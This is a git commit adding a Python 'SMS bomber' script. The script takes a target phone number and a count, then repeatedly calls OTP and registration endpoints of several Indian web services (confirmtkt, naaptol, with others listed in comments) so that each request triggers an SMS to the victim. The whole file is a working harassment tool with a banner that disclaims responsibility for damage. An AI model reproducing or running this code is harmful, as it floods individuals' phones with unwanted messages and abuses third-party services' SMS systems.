a4f259a4d335e052f34da4381b985e3fc1b80a6d
Arnav Sharma <128835090+arn4vz@users.noreply.github.com>
2023-05-19 20:04:27 +0530

    Create sms-bomber.py

---
+++ sms-bomber.py
@@ -0,0 +1,65 @@
+from urllib.request import Request,urlopen
+from urllib.parse import urlencode,quote_plus
+import platform
+import os
+import time
+import urllib
+import urllib.request
+import http.cookiejar
+
+Z = '\033[1;31m' #احمر
+X = '\033[1;33m' #اصفر
+Z1 = '\033[2;31m' #احمر ثاني
+F = '\033[2;32m' #اخضر
+A = '\033[2;34m'#ازرق
+C = '\033[2;35m' #وردي
+B = '\033[2;36m'#سمائي
+Y = '\033[1;34m' #ازرق فاتح
+W = "\033[1;37m" # White
+
+def banner():
+    if platform.system().lower()=="windows":
+        os.system("cls")
+    else:
+        os.system("clear")
+    print("""
+
+  /$$$$$$  /$$      /$$  /$$$$$$        /$$$$$$$   /$$$$$$  /$$      /$$ /$$$$$$$  /$$$$$$$$ /$$$$$$$ 
+ /$$  $$| $$$    /$$$ /$$  $$      | $$  $$ /$$  $$| $$$    /$$$| $$  $$| $$_/| $$  $$
+| $$  \/| $$$$  /$$$$| $$  \/      | $$  \ $$| $$  \ $$| $$$$  /$$$$| $$  \ $$| $$      | $$  \ $$
+|  $$$$$$ | $$ $$/$$ $$|  $$$$$$       | $$$$$$$ | $$  | $$| $$ $$/$$ $$| $$$$$$$ | $$$$$   | $$$$$$$/
+ \__  $$| $$  $$$| $$ \  $$      | $$  $$| $$  | $$| $$  $$$| $$| $$  $$| $$/   | $$__  $$
+ /$$  \ $$| $$\  $ | $$ /$$  \ $$      | $$  \ $$| $$  | $$| $$\  $ | $$| $$  \ $$| $$      | $$  \ $$
+|  $$$$$$/| $$ \/  | $$|  $$$$$$/      | $$$$$$$/|  $$$$$$/| $$ \/  | $$| $$$$$$$/| $$$$$$$$| $$  | $$
+ \__/ |/     |/ \__/       |_/  \__/ |/     |/|_/ |__/|/  |__/
+                                                                                                                                                                                                    
+                                   By : @ARN4V_18  
+                                                                                                                                  
+    Note : I won't be responsible for any damage caused by this script, Use at your own risk
+    
+""")
+#http://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile=
+
+#https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=
+
+#http://t.justdial.com/api/india_api_write/10aug2016/sendvcode.php?mobile=
+
+#http://www.quikr.com/SignIn?aj=1&for=send_otp&user=
+
+def send(num, counter, slep):
+    url1 = ["https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=","https://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile="]
+    #url="https://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile="
+    data={"phone":num}
+    x=y=0
+    for y in range(int(counter)):
+        for x in url1:
+            banner()
+            print("Target Number          : ", num)
+            print("Number of Message Sent : ", y+1)
+            result_url=str(x)+num
+            resp1=Request(result_url)
+            urlopen(resp1)
+            time.sleep(slep)        
+
+banner()
+send(input(f"{X} ➠ENTER NUMBER {C}"), input(f"{X} ➠NUMBER OF MESSAGES {C}"), 1)
